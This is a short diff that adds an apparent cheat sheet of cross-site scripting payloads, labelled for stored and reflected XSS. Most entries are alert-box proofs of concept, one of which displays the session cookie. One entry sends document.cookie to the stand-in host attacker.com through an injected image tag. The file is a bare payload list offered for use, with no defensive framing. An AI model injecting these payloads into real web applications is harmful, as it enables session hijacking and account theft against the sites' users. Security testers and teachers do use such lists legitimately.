@@ -1,0 +1,13 @@
+# --- Stored XSS ---
+# Simple Alert Box
+<script>alert('Stored XSS by [YourName]!')</script>
+
+# Cookie Stealing (Conceptual - requires attacker listener)
+<script>document.write('<img src="http://attacker.com/log?c='+document.cookie+'">')</script>
+
+# --- Reflected XSS ---
+# Simple Alert Box
+<script>alert('Reflected XSS!')</script>
+
+# Alerting the Session Cookie
+<script>alert(document.cookie)</script>
